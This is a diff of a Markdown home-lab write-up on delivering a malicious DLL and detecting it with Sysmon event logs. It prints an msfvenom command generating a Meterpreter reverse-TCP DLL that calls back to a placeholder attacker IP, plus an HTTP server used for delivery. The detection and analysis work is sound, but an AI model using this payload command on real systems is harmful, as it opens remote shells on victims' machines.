@@ -75,32 +75,32 @@ def get_notepad_pid():
 pid = get_notepad_pid()
 
 
-```
+
 
 ### Embedding the Payload
 
 Was generated the malicious DLL payload using Metasploit's `msfvenom`:
 
-```bash
+`bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f dll > test.dll
-```
+
 
 ### Creating the Executable
 
 Initially, I used PyInstaller to compile the Python script into an executable. However, running the resulting binary on the target machine failed due to environment compatibility issues. 
 To solve this, I used **Wine** on Kali Linux to simulate a Windows environment and generate a compatible executable.
 
-[PICTURE 1 executable done]
+![Image](https://github.com/user-attachments/assets/2dba5d56-2ce5-4e48-bb1f-ca5d9d127634)
 
 ### Delivery Method
 
 To deliver the payload, I used a simple Python HTTP server on the attacker machine and set up a listener.
 
-```bash
+bash
 python3 -m http.server 8000
-```
 
-[ PICTURE OF THE TARGET BROWSER]
+
+![Image](https://github.com/user-attachments/assets/f0aec13c-2cd1-43fc-a262-b08449a5e8a7)
 
 ---
 
@@ -108,7 +108,7 @@ python3 -m http.server 8000
 
 Despite disabling basic Windows Defender features, getting a stable reverse connection was challenging. Still, Sysmon successfully logged multiple indicators of compromise.
 
-[PICTURE EVENT VIEWER]
+![Image](https://github.com/user-attachments/assets/0255d64d-235d-4f04-9724-b835fa43fb43)
 
 ---
 
@@ -140,7 +140,7 @@ RuleName -
   ParentImage C:\Windows\explorer.exe 
   ParentCommandLine C:\Windows\Explorer.EXE 
   ParentUser DESKTOP-OBMB5FQ\home 
-```
+
 
 **Explanation**: Event ID 1 logs every process creation. Although not inherently malicious, indicators like missing file metadata (Company, Description) and hash verification help identify suspicious files.
 The parent process being `explorer.exe` suggests user interaction (manual execution).
@@ -177,7 +177,7 @@ It's a passive but strong indicator that the file was executed.
 **Explanation**: The process was terminated shortly after execution, potentially due to Windows defenses or a code error. 
 Troubleshooting this issue was beyond the scope of this article, so a simpler payload was created to continue the lab.
 
-[PICTURE OF NEW PAYLOAD]
+![Image](https://github.com/user-attachments/assets/fdcbacff-886d-4848-aa5e-cea5c3c700f4)
 
 ### Event ID 3: Network Connection
 
